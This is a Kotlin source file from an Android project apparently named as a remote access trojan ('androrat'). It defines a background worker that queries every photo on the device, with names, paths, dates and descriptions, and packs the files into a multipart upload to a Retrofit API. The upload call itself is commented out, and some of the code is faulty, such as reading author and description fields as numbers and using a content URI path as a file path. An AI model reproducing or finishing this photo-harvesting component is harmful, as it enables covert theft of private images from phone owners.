package com.ierusalem.androrat.worker

import android.content.ContentUris
import android.content.Context
import android.provider.MediaStore
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.ierusalem.androrat.networking.RetrofitInstance
import com.ierusalem.androrat.screens.home.Image
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import retrofit2.HttpException
import java.io.File

class PhotosUploadWorker(context: Context, workerParameters: WorkerParameters) :
    CoroutineWorker(context, workerParameters) {

    private lateinit var images: List<Image>

    override suspend fun doWork(): Result {

        //todo add location later
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.AUTHOR,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media.DESCRIPTION
        )
        //selection defines which photos we want to read, null means all of them
        val selection = null
        val selectionArgs = null
        val sortOrder =
            "${MediaStore.Images.Media.DATE_TAKEN} DESC"

        applicationContext.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            selection,
            selectionArgs,
            sortOrder
        )?.use { cursor ->
            val idColumn =
                cursor.getColumnIndex(MediaStore.Images.Media._ID)
            val authorColumn =
                cursor.getColumnIndex(MediaStore.Images.Media.AUTHOR)
            val displayNameColumn =
                cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
            val dataColumn =
                cursor.getColumnIndex(MediaStore.Images.Media.DATA)
            val dataTakenColumn =
                cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)
            val descriptionColumn =
                cursor.getColumnIndex(MediaStore.Images.Media.DESCRIPTION)

            val imagesX = mutableListOf<Image>()
            while (cursor.moveToNext()) {
                val id = cursor.getLong(idColumn)
                val author = cursor.getLong(authorColumn)
                val disPlayName =
                    cursor.getString(displayNameColumn)
                val data = cursor.getString(dataColumn)
                val dataTaken =
                    cursor.getLong(dataTakenColumn)
                val description =
                    cursor.getLong(descriptionColumn)

                val uri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    id
                )
                imagesX.add(
                    Image(
                        id = id,
                        author = author,
                        displayName = disPlayName,
                        data = data,
                        dataTaken = dataTaken,
                        description = description,
                        uri = uri
                    )
                )
            }
            images = imagesX
        }

        val parts : MutableList<MultipartBody.Part> = mutableListOf()
        images.forEach { image ->
            val file = image.uri.path?.let { File(it) }
            if(file!= null){
                parts.add(
                    MultipartBody.Part.createFormData(
                        "image",
                        file.name,
                        file.asRequestBody())
                )
            }
        }

        val apiService = RetrofitInstance(applicationContext).api
        return try {
//            apiService.postImages(
//                description = "test",
//                images = parts
//            )
            Result.success()

        } catch (e: Exception) {
            e.printStackTrace()
            Log.d("ahi3646_view_model", "sendMessages: exception ${e.localizedMessage} ")
            Result.failure()
        } catch (e: HttpException) {
            e.printStackTrace()
            Log.d("ahi3646_view_model", "sendMessages: exception ${e.localizedMessage} ")
            Result.failure()
        }
    }
}

